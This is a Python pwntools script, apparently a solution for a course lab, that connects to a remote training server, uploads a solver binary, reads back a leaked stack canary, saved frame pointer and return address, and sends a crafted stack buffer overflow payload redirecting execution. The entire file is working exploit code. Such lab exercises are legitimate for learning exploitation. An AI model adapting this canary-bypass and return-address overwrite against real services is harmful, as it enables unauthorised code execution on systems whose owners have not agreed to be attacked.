#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()
# r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)


if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)
if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
    guess=1234
    r.recvline()
    canary=int(r.recvline())
    rbp=int(r.recvline())
    address=int(r.recvline())+0XAB
    input=str(guess).encode('ascii').ljust(0x18, b'\0')+p64(canary)+p64(rbp)+p64(address).ljust(0x14, b'\0')+p32(guess)
    r.send(input)

else:
    r.sendlineafter(b'send to me? ', b'0')

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :